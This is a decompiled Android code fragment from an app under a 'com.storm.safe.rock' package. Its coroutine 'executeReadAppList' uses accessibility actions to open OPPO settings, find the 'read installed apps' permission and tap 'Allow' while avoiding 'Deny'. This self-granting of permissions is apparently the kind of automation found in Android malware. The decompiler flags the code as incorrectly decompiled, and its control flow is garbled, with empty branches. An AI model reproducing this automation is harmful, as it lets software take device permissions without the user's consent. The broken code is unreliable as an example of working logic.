        if (p000.b81.m210571b1(r5, r0) == r4) goto L214;
     */
    /* JADX WARN: Code restructure failed: missing block: B:54:0x018c, code lost:
    
        if (p000.b81.m210571b1(r13, r3) == r4) goto L214;
     */
    /* JADX WARN: Code restructure failed: missing block: B:83:0x0261, code lost:
    
        if (p000.b81.m210571b1(r1, r3) == r4) goto L214;
     */
    /* JADX WARN: Removed duplicated region for block: B:100:0x02cc  */
    /* JADX WARN: Removed duplicated region for block: B:107:0x02ec  */
    /* JADX WARN: Removed duplicated region for block: B:114:0x0314 A[PHI: r5 r9 r18
      0x0314: PHI (r5v20 int) = (r5v15 int), (r5v17 int), (r5v18 int), (r5v28 int) binds: [B:99:0x02ca, B:113:0x0313, B:112:0x0310, B:21:0x009f] A[DONT_GENERATE, DONT_INLINE]
      0x0314: PHI (r9v13 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r9v6 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r9v10 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r9v11 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r9v14 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:99:0x02ca, B:113:0x0313, B:112:0x0310, B:21:0x009f] A[DONT_GENERATE, DONT_INLINE]
      0x0314: PHI (r18v17 vv) = (r18v13 vv), (r18v15 vv), (r18v15 vv), (r18v18 vv) binds: [B:99:0x02ca, B:113:0x0313, B:112:0x0310, B:21:0x009f] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:115:0x0316  */
    /* JADX WARN: Removed duplicated region for block: B:127:0x0365  */
    /* JADX WARN: Removed duplicated region for block: B:134:0x038c A[PHI: r5 r8 r9 r18
      0x038c: PHI (r5v35 int) = (r5v32 int), (r5v38 int) binds: [B:132:0x0388, B:18:0x0078] A[DONT_GENERATE, DONT_INLINE]
      0x038c: PHI (r8v7 java.util.List) = (r8v5 java.util.List), (r8v8 java.util.List) binds: [B:132:0x0388, B:18:0x0078] A[DONT_GENERATE, DONT_INLINE]
      0x038c: PHI (r9v21 com.storm.safe.rock.service.modules.yw5xud.a5) = (r9v18 com.storm.safe.rock.service.modules.yw5xud.a5), (r9v22 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:132:0x0388, B:18:0x0078] A[DONT_GENERATE, DONT_INLINE]
      0x038c: PHI (r18v25 vv) = (r18v22 vv), (r18v26 vv) binds: [B:132:0x0388, B:18:0x0078] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:137:0x0396  */
    /* JADX WARN: Removed duplicated region for block: B:145:0x03c1  */
    /* JADX WARN: Removed duplicated region for block: B:189:0x04f1  */
    /* JADX WARN: Removed duplicated region for block: B:198:0x0517  */
    /* JADX WARN: Removed duplicated region for block: B:202:0x0531  */
    /* JADX WARN: Removed duplicated region for block: B:205:0x053a  */
    /* JADX WARN: Removed duplicated region for block: B:210:0x0555  */
    /* JADX WARN: Removed duplicated region for block: B:211:0x0563  */
    /* JADX WARN: Removed duplicated region for block: B:240:0x0313 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:246:0x02c9 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:49:0x0168  */
    /* JADX WARN: Removed duplicated region for block: B:53:0x0181  */
    /* JADX WARN: Removed duplicated region for block: B:59:0x01c3  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:86:0x0270  */
    /* JADX WARN: Removed duplicated region for block: B:88:0x0274  */
    /* JADX WARN: Removed duplicated region for block: B:92:0x02a4  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:81:0x0230 -> B:85:0x0265). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:83:0x0261 -> B:85:0x0265). Please report as a decompilation issue!!! */
    /* renamed from: c9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212331c9(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$executeReadAppList$1 oppoStepsSimplified$executeReadAppList$1;
        C0368a5 c0368a5;
        C0368a5 c0368a52;
        List<String> listM213306g5;
        int i;
        int i2;
        C1351vv c1351vv;
        List listM213306g52;
        Iterator it;
        int i3;
        C1351vv c1351vv2;
        List list;
        C0368a5 c0368a53;
        Iterator it2;
        OppoStepsSimplified$executeReadAppList$1 oppoStepsSimplified$executeReadAppList$12;
        C0368a5 c0368a54;
        List<String> listM213306g53;
        int i4;
        List list2;
        List<String> list3;
        C0368a5 c0368a55;
        int i5;
        String string;
        int i6;
        long j;
        C0368a5 c0368a56;
        C1351vv c1351vv3 = C1351vv.f60710b1;
        if (continuationImpl instanceof OppoStepsSimplified$executeReadAppList$1) {
            oppoStepsSimplified$executeReadAppList$1 = (OppoStepsSimplified$executeReadAppList$1) continuationImpl;
            int i7 = oppoStepsSimplified$executeReadAppList$1.f54597a6;
            if ((i7 & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$executeReadAppList$1.f54597a6 = i7 - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$executeReadAppList$1 = new OppoStepsSimplified$executeReadAppList$1(this, continuationImpl);
            }
        }
        Object objM212342e6 = oppoStepsSimplified$executeReadAppList$1.f54595a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        switch (oppoStepsSimplified$executeReadAppList$1.f54597a6) {
            case 0:
                kg1.m213544f4(objM212342e6);
                if (m212336d9("applist")) {
                    m212303e0("⏭️ 读取应用列表已完成，跳过");
                    return c1351vv3;
                }
                boolean z = this.f55119a8;
                boolean z2 = this.f55117a6;
                boolean z3 = z2 || z;
                m212303e0("[流程] 读取应用列表权限");
                m212303e0("SDK版本: " + this.f55113a2 + " | 需要手动开启: " + z3 + " (A12=" + z2 + ", A14+=" + z + ")");
                if (!z3) {
                    m212303e0("★ Android 13/11及以下：权限通过 AndroidManifest.xml 声明");
                    m212303e0("★ 安装时已自动授予，无需手动配置");
                    m212341e5("applist");
                    m212303e0("✅ 步骤已自动完成（安装时授予）");
                    return c1351vv3;
                }
                m212303e0("[流程] 应用详情 → 权限管理 → 读取应用列表");
                m212303e0("[8.1] 直接打开应用详情页...");
                oppoStepsSimplified$executeReadAppList$1.f54591a0 = this;
                oppoStepsSimplified$executeReadAppList$1.f54597a6 = 1;
                objM212342e6 = m212342e6(oppoStepsSimplified$executeReadAppList$1);
                if (objM212342e6 != coroutineSingletons) {
                    c0368a5 = this;
                    if (!((Boolean) objM212342e6).booleanValue()) {
                        long j2 = c0368a5.f55123b2;
                        oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a5;
                        oppoStepsSimplified$executeReadAppList$1.f54597a6 = 3;
                        break;
                    } else {
                        c0368a5.getClass();
                        m212303e0("⚠️ 无法打开应用详情页，等待重试");
                        oppoStepsSimplified$executeReadAppList$1.f54591a0 = null;
                        oppoStepsSimplified$executeReadAppList$1.f54597a6 = 2;
                        if (c0368a5.m212347f2(oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                            return c1351vv3;
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                c0368a5 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                if (!((Boolean) objM212342e6).booleanValue()) {
                }
                return coroutineSingletons;
            case 2:
                kg1.m213544f4(objM212342e6);
                return c1351vv3;
            case 3:
                c0368a5 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c0368a52 = c0368a5;
                listM213306g5 = AbstractC0716jf.m213306g5("强行停止", "卸载", "存储占用", "流量使用情况", "通知管理", "权限管理", "Force stop", "Uninstall", "Storage", "Data usage", "Notifications", "Permissions", "Force stop", "Uninstall", "Storage", "Data usage", "Notifications", "Permissions");
                i = 0;
                i2 = 0;
                if (i < 4) {
                    c0368a52.getClass();
                    ArrayList arrayList = new ArrayList();
                    AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = c0368a52.m212335d8();
                    if (accessibilityNodeInfoM212335d8 != null) {
                        m212295b0(accessibilityNodeInfoM212335d8, arrayList);
                    }
                    if (listM213306g5 == null || !listM213306g5.isEmpty()) {
                        for (String str : listM213306g5) {
                            if (arrayList.isEmpty()) {
                                c1351vv = c1351vv3;
                            } else {
                                int size = arrayList.size();
                                c1351vv = c1351vv3;
                                int i8 = 0;
                                while (i8 < size) {
                                    Object obj = arrayList.get(i8);
                                    i8++;
                                    int i9 = size;
                                    String str2 = (String) obj;
                                    ArrayList arrayList2 = arrayList;
                                    if (AbstractC0779a1.m213652a5(str2, str, false)) {
                                        m212303e0("    ✅ 找到应用详情页特征");
                                        i2 = 1;
                                    } else {
                                        arrayList = arrayList2;
                                        size = i9;
                                    }
                                }
                            }
                            c1351vv3 = c1351vv;
                            arrayList = arrayList;
                        }
                    }
                    c1351vv2 = c1351vv3;
                    if (i < 3) {
                        m212303e0("    [返回" + (i + 1) + "/3] 尝试返回到应用详情页顶部...");
                        c0368a52.f55111a0.performGlobalAction(1);
                        long j3 = c0368a52.f55126b5;
                        oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a52;
                        oppoStepsSimplified$executeReadAppList$1.f54592a1 = listM213306g5;
                        oppoStepsSimplified$executeReadAppList$1.f54593a2 = i2;
                        oppoStepsSimplified$executeReadAppList$1.f54594a3 = i;
                        oppoStepsSimplified$executeReadAppList$1.f54597a6 = 4;
                        break;
                    }
                    i++;
                    c1351vv3 = c1351vv2;
                    if (i < 4) {
                        c1351vv = c1351vv3;
                    }
                }
                if (i2 == 0) {
                    c0368a52.getClass();
                    m212303e0("⚠️ 无法确认在应用详情页顶部，继续尝试...");
                }
                c0368a52.m212317b5("应用详情页");
                m212303e0("[8.2] 查找并点击[权限管理]...");
                listM213306g52 = AbstractC0716jf.m213306g5("权限管理", "权限", "应用权限", "Permissions", "Permission manager", "App permissions");
                it = listM213306g52.iterator();
                while (true) {
                    if (it.hasNext()) {
                        i3 = 0;
                    } else {
                        String str3 = (String) it.next();
                        if (c0368a52.m212312a7(str3)) {
                            AbstractC0003a2.m46c7("✅ 直接点击[", str3, "]成功");
                            long j4 = c0368a52.f55123b2;
                            oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a52;
                            oppoStepsSimplified$executeReadAppList$1.f54592a1 = listM213306g52;
                            oppoStepsSimplified$executeReadAppList$1.f54593a2 = 1;
                            oppoStepsSimplified$executeReadAppList$1.f54597a6 = 5;
                            if (b81.m210571b1(j4, oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                                i3 = 1;
                            }
                        }
                    }
                }
                if (i3 == 0) {
                    oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a52;
                    oppoStepsSimplified$executeReadAppList$1.f54592a1 = listM213306g52;
                    oppoStepsSimplified$executeReadAppList$1.f54593a2 = i3;
                    oppoStepsSimplified$executeReadAppList$1.f54597a6 = 6;
                    if (c0368a52.m212350f5(oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                        C0368a5 c0368a57 = c0368a52;
                        list = listM213306g52;
                        c0368a53 = c0368a57;
                        it2 = list.iterator();
                        while (true) {
                            if (it2.hasNext()) {
                                c0368a52 = c0368a53;
                            } else {
                                String str4 = (String) it2.next();
                                if (c0368a53.m212312a7(str4)) {
                                    AbstractC0003a2.m46c7("✅ 滚动后点击[", str4, "]成功");
                                    long j5 = c0368a53.f55123b2;
                                    oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a53;
                                    oppoStepsSimplified$executeReadAppList$1.f54592a1 = null;
                                    oppoStepsSimplified$executeReadAppList$1.f54593a2 = 1;
                                    oppoStepsSimplified$executeReadAppList$1.f54597a6 = 7;
                                    if (b81.m210571b1(j5, oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                                        c0368a52 = c0368a53;
                                        i3 = 1;
                                    }
                                }
                            }
                        }
                        if (i3 == 0) {
                            c0368a52.m212317b5("权限管理页");
                            m212303e0("[8.3] 查找[读取应用列表]...");
                            listM213306g53 = AbstractC0716jf.m213306g5("读取应用列表", "应用列表", "查看已安装应用", "获取应用列表");
                            for (String str5 : listM213306g53) {
                                if (c0368a52.m212312a7(str5)) {
                                    AbstractC0003a2.m46c7("✅ 直接点击[", str5, "]成功");
                                    long j6 = c0368a52.f55123b2;
                                    oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a52;
                                    oppoStepsSimplified$executeReadAppList$1.f54592a1 = listM213306g53;
                                    oppoStepsSimplified$executeReadAppList$1.f54593a2 = 1;
                                    oppoStepsSimplified$executeReadAppList$1.f54597a6 = 8;
                                    if (b81.m210571b1(j6, oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                                        list2 = listM213306g53;
                                        i4 = 1;
                                        listM213306g53 = list2;
                                        if (i4 == 0) {
                                            oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a52;
                                            oppoStepsSimplified$executeReadAppList$1.f54592a1 = listM213306g53;
                                            oppoStepsSimplified$executeReadAppList$1.f54593a2 = i4;
                                            oppoStepsSimplified$executeReadAppList$1.f54597a6 = 9;
                                            if (b81.m210571b1(500L, oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                                                list3 = listM213306g53;
                                                oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a52;
                                                oppoStepsSimplified$executeReadAppList$1.f54592a1 = list3;
                                                oppoStepsSimplified$executeReadAppList$1.f54593a2 = i4;
                                                oppoStepsSimplified$executeReadAppList$1.f54597a6 = 10;
                                                if (c0368a52.m212350f5(oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                                                    for (String str6 : list3) {
                                                        if (c0368a52.m212312a7(str6)) {
                                                            AbstractC0003a2.m46c7("✅ 滚动后点击[", str6, "]成功");
                                                            long j7 = c0368a52.f55123b2;
                                                            oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a52;
                                                            oppoStepsSimplified$executeReadAppList$1.f54592a1 = null;
                                                            oppoStepsSimplified$executeReadAppList$1.f54593a2 = 1;
                                                            oppoStepsSimplified$executeReadAppList$1.f54597a6 = 11;
                                                            if (b81.m210571b1(j7, oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                                                                c0368a55 = c0368a52;
                                                                i4 = 1;
                                                                if (i4 != 0) {
                                                                    c0368a55.getClass();
                                                                    m212303e0("⚠️ 未找到[读取应用列表]，可能不需要此权限");
                                                                    c0368a55.m212341e5("applist");
                                                                    oppoStepsSimplified$executeReadAppList$12 = oppoStepsSimplified$executeReadAppList$1;
                                                                    c0368a54 = c0368a55;
                                                                    c0368a54.f55111a0.performGlobalAction(1);
                                                                    long j8 = c0368a54.f55121b0;
                                                                    oppoStepsSimplified$executeReadAppList$12.f54591a0 = c0368a54;
                                                                    oppoStepsSimplified$executeReadAppList$12.f54592a1 = null;
                                                                    oppoStepsSimplified$executeReadAppList$12.f54597a6 = 17;
                                                                    break;
                                                                } else {
                                                                    c0368a55.m212317b5("读取应用列表权限页");
                                                                    long j9 = c0368a55.f55122b1;
                                                                    m212303e0("[8.4] 点击[允许]...");
                                                                    AccessibilityNodeInfo accessibilityNodeInfoM212335d82 = c0368a55.m212335d8();
                                                                    if (accessibilityNodeInfoM212335d82 == null) {
                                                                        j = c0368a55.f55124b3;
                                                                        oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a55;
                                                                        oppoStepsSimplified$executeReadAppList$1.f54592a1 = null;
                                                                        oppoStepsSimplified$executeReadAppList$1.f54597a6 = 15;
                                                                        if (b81.m210571b1(j, oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                                                                            c0368a56 = c0368a55;
                                                                            if (!c0368a56.m212308a3("确定")) {
                                                                                c0368a56.m212307a2();
                                                                            }
                                                                            c0368a56.f55111a0.performGlobalAction(1);
                                                                            long j10 = c0368a56.f55121b0;
                                                                            oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a56;
                                                                            oppoStepsSimplified$executeReadAppList$1.f54597a6 = 16;
                                                                            break;
                                                                        }
                                                                    } else {
                                                                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM212335d82.findAccessibilityNodeInfosByText("允许");
                                                                        m212303e0("    找到" + (listFindAccessibilityNodeInfosByText != null ? listFindAccessibilityNodeInfosByText.size() : 0) + "个包含'允许'的节点");
                                                                        ArrayList arrayList3 = new ArrayList();
                                                                        if (listFindAccessibilityNodeInfosByText == null) {
                                                                            listFindAccessibilityNodeInfosByText = EmptyList.f57568a0;
                                                                        }
                                                                        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                                                                            CharSequence text = accessibilityNodeInfo.getText();
                                                                            if (text == null || (string = text.toString()) == null) {
                                                                                string = "";
                                                                            }
                                                                            AbstractC0003a2.m46c7("    检查节点: text='", string, "'");
                                                                            if (AbstractC0779a1.m213652a5(string, "不允许", false) || AbstractC0779a1.m213652a5(string, "不允", false) || string.equalsIgnoreCase("Deny") || string.equalsIgnoreCase("Don't allow")) {
                                                                                AbstractC0003a2.m46c7("    ❌ 跳过'", string, "'(包含不允许)");
                                                                            } else if (string.equals("允许")) {
                                                                                m212303e0("    ★ 找到精确匹配'允许'");
                                                                                arrayList3.add(accessibilityNodeInfo);
                                                                            }
                                                                        }
                                                                        i5 = 0;
                                                                        m212303e0("    有效的'允许'节点数: " + arrayList3.size());
                                                                        int size2 = arrayList3.size();
                                                                        int i10 = 0;
                                                                        while (i10 < size2) {
                                                                            Object obj2 = arrayList3.get(i10);
                                                                            i10++;
                                                                            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj2;
                                                                            Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo2);
                                                                            float fCenterX = rectM24a5.centerX();
                                                                            float fCenterY = rectM24a5.centerY();
                                                                            m212303e0("    手势点击'允许'坐标: (" + fCenterX + ", " + fCenterY + ")");
                                                                            if (c0368a55.m212309a4(fCenterX, fCenterY)) {
                                                                                m212303e0("    ✅ 手势点击[允许]成功");
                                                                                oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a55;
                                                                                oppoStepsSimplified$executeReadAppList$1.f54592a1 = null;
                                                                                oppoStepsSimplified$executeReadAppList$1.f54593a2 = 1;
                                                                                oppoStepsSimplified$executeReadAppList$1.f54597a6 = 12;
                                                                                break;
                                                                            } else if (accessibilityNodeInfo2.performAction(16)) {
                                                                                m212303e0("    ✅ 直接点击[允许]成功");
                                                                                oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a55;
                                                                                oppoStepsSimplified$executeReadAppList$1.f54592a1 = null;
                                                                                oppoStepsSimplified$executeReadAppList$1.f54593a2 = 1;
                                                                                oppoStepsSimplified$executeReadAppList$1.f54597a6 = 13;
                                                                                break;
                                                                            }
                                                                            if (i5 == 0) {
                                                                                if (c0368a55.m212307a2()) {
                                                                                    m212303e0("[读取应用列表] 备用方法点击[允许]成功");
                                                                                    i6 = 1;
                                                                                } else {
                                                                                    i6 = i5;
                                                                                }
                                                                                long j11 = c0368a55.f55122b1;
                                                                                oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a55;
                                                                                oppoStepsSimplified$executeReadAppList$1.f54592a1 = null;
                                                                                oppoStepsSimplified$executeReadAppList$1.f54593a2 = i6;
                                                                                oppoStepsSimplified$executeReadAppList$1.f54597a6 = 14;
                                                                                break;
                                                                            }
                                                                            if (i5 != 0) {
                                                                                c0368a55.m212341e5("applist");
                                                                                m212303e0("✅ 读取应用列表流程完成");
                                                                            }
                                                                            j = c0368a55.f55124b3;
                                                                            oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a55;
                                                                            oppoStepsSimplified$executeReadAppList$1.f54592a1 = null;
                                                                            oppoStepsSimplified$executeReadAppList$1.f54597a6 = 15;
                                                                            if (b81.m210571b1(j, oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                                                                            }
                                                                        }
                                                                        if (i5 == 0) {
                                                                        }
                                                                        if (i5 != 0) {
                                                                        }
                                                                        j = c0368a55.f55124b3;
                                                                        oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a55;
                                                                        oppoStepsSimplified$executeReadAppList$1.f54592a1 = null;
                                                                        oppoStepsSimplified$executeReadAppList$1.f54597a6 = 15;
                                                                        if (b81.m210571b1(j, oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                        c0368a55 = c0368a52;
                                        if (i4 != 0) {
                                        }
                                    }
                                }
                            }
                            i4 = 0;
                            if (i4 == 0) {
                            }
                            c0368a55 = c0368a52;
                            if (i4 != 0) {
                            }
                        } else {
                            oppoStepsSimplified$executeReadAppList$12 = oppoStepsSimplified$executeReadAppList$1;
                            c0368a54 = c0368a52;
                            c0368a54.f55111a0.performGlobalAction(1);
                            long j82 = c0368a54.f55121b0;
                            oppoStepsSimplified$executeReadAppList$12.f54591a0 = c0368a54;
                            oppoStepsSimplified$executeReadAppList$12.f54592a1 = null;
                            oppoStepsSimplified$executeReadAppList$12.f54597a6 = 17;
                        }
                    }
                } else if (i3 == 0) {
                }
                return coroutineSingletons;
            case 4:
                i = oppoStepsSimplified$executeReadAppList$1.f54594a3;
                i2 = oppoStepsSimplified$executeReadAppList$1.f54593a2;
                listM213306g5 = oppoStepsSimplified$executeReadAppList$1.f54592a1;
                c0368a52 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv2 = c1351vv3;
                i++;
                c1351vv3 = c1351vv2;
                if (i < 4) {
                }
                if (i2 == 0) {
                }
                c0368a52.m212317b5("应用详情页");
                m212303e0("[8.2] 查找并点击[权限管理]...");
                listM213306g52 = AbstractC0716jf.m213306g5("权限管理", "权限", "应用权限", "Permissions", "Permission manager", "App permissions");
                it = listM213306g52.iterator();
                while (true) {
                    if (it.hasNext()) {
                    }
                }
                if (i3 == 0) {
                }
                return coroutineSingletons;
            case 5:
                i3 = oppoStepsSimplified$executeReadAppList$1.f54593a2;
                listM213306g52 = oppoStepsSimplified$executeReadAppList$1.f54592a1;
                c0368a52 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv = c1351vv3;
                if (i3 == 0) {
                }
                return coroutineSingletons;
            case 6:
                i3 = oppoStepsSimplified$executeReadAppList$1.f54593a2;
                list = oppoStepsSimplified$executeReadAppList$1.f54592a1;
                c0368a53 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv = c1351vv3;
                it2 = list.iterator();
                while (true) {
                    if (it2.hasNext()) {
                    }
                }
                if (i3 == 0) {
                }
                break;
            case 7:
                i3 = oppoStepsSimplified$executeReadAppList$1.f54593a2;
                c0368a52 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv = c1351vv3;
                if (i3 == 0) {
                }
                break;
            case 8:
                i4 = oppoStepsSimplified$executeReadAppList$1.f54593a2;
                list2 = oppoStepsSimplified$executeReadAppList$1.f54592a1;
                c0368a52 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv = c1351vv3;
                listM213306g53 = list2;
                if (i4 == 0) {
                }
                c0368a55 = c0368a52;
                if (i4 != 0) {
                }
                break;
            case 9:
                i4 = oppoStepsSimplified$executeReadAppList$1.f54593a2;
                list3 = oppoStepsSimplified$executeReadAppList$1.f54592a1;
                c0368a52 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv = c1351vv3;
                oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a52;
                oppoStepsSimplified$executeReadAppList$1.f54592a1 = list3;
                oppoStepsSimplified$executeReadAppList$1.f54593a2 = i4;
                oppoStepsSimplified$executeReadAppList$1.f54597a6 = 10;
                if (c0368a52.m212350f5(oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 10:
                i4 = oppoStepsSimplified$executeReadAppList$1.f54593a2;
                list3 = oppoStepsSimplified$executeReadAppList$1.f54592a1;
                c0368a52 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv = c1351vv3;
                while (r0.hasNext()) {
                }
                c0368a55 = c0368a52;
                if (i4 != 0) {
                }
                break;
            case oe0.DEFAULT_M /* 11 */:
                i4 = oppoStepsSimplified$executeReadAppList$1.f54593a2;
                c0368a55 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv = c1351vv3;
                if (i4 != 0) {
                }
                break;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
            case 13:
                int i11 = oppoStepsSimplified$executeReadAppList$1.f54593a2;
                c0368a55 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv = c1351vv3;
                i5 = i11;
                if (i5 == 0) {
                }
                if (i5 != 0) {
                }
                j = c0368a55.f55124b3;
                oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a55;
                oppoStepsSimplified$executeReadAppList$1.f54592a1 = null;
                oppoStepsSimplified$executeReadAppList$1.f54597a6 = 15;
                if (b81.m210571b1(j, oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 14:
                i6 = oppoStepsSimplified$executeReadAppList$1.f54593a2;
                c0368a55 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv = c1351vv3;
                i5 = i6;
                if (i5 != 0) {
                }
                j = c0368a55.f55124b3;
                oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a55;
                oppoStepsSimplified$executeReadAppList$1.f54592a1 = null;
                oppoStepsSimplified$executeReadAppList$1.f54597a6 = 15;
                if (b81.m210571b1(j, oppoStepsSimplified$executeReadAppList$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                c0368a56 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv = c1351vv3;
                if (!c0368a56.m212308a3("确定")) {
                }
                c0368a56.f55111a0.performGlobalAction(1);
                long j102 = c0368a56.f55121b0;
                oppoStepsSimplified$executeReadAppList$1.f54591a0 = c0368a56;
                oppoStepsSimplified$executeReadAppList$1.f54597a6 = 16;
                break;
            case 16:
                c0368a56 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv = c1351vv3;
                oppoStepsSimplified$executeReadAppList$12 = oppoStepsSimplified$executeReadAppList$1;
                c0368a54 = c0368a56;
                c0368a54.f55111a0.performGlobalAction(1);
                long j822 = c0368a54.f55121b0;
                oppoStepsSimplified$executeReadAppList$12.f54591a0 = c0368a54;
                oppoStepsSimplified$executeReadAppList$12.f54592a1 = null;
                oppoStepsSimplified$executeReadAppList$12.f54597a6 = 17;
                break;
            case 17:
                c0368a54 = oppoStepsSimplified$executeReadAppList$1.f54591a0;
                kg1.m213544f4(objM212342e6);
                c1351vv = c1351vv3;
                if (c0368a54.m212336d9("applist")) {
                    return c1351vv;
                }
                m212303e0("⚠️ 读取应用列表未成功，下次重新进入时会继续");
                return c1351vv;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: d0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212332d0(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$executeReadAppListWithResult$1 oppoStepsSimplified$executeReadAppListWithResult$1;
        C0368a5 c0368a5;
        boolean zM212336d9;
        if (continuationImpl instanceof OppoStepsSimplified$executeReadAppListWithResult$1) {
            oppoStepsSimplified$executeReadAppListWithResult$1 = (OppoStepsSimplified$executeReadAppListWithResult$1) continuationImpl;
            int i = oppoStepsSimplified$executeReadAppListWithResult$1.f54601a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$executeReadAppListWithResult$1.f54601a3 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$executeReadAppListWithResult$1 = new OppoStepsSimplified$executeReadAppListWithResult$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$executeReadAppListWithResult$1.f54599a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = oppoStepsSimplified$executeReadAppListWithResult$1.f54601a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            try {
                oppoStepsSimplified$executeReadAppListWithResult$1.f54598a0 = this;
                oppoStepsSimplified$executeReadAppListWithResult$1.f54601a3 = 1;
                if (m212331c9(oppoStepsSimplified$executeReadAppListWithResult$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                c0368a5 = this;
            } catch (Exception e) {
                e = e;
                c0368a5 = this;
                String str = "❌ 读取应用列表设置异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str);
                zM212336d9 = false;
                return Boolean.valueOf(zM212336d9);
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0368a5 = oppoStepsSimplified$executeReadAppListWithResult$1.f54598a0;
            try {
                kg1.m213544f4(obj);
            } catch (Exception e2) {
                e = e2;
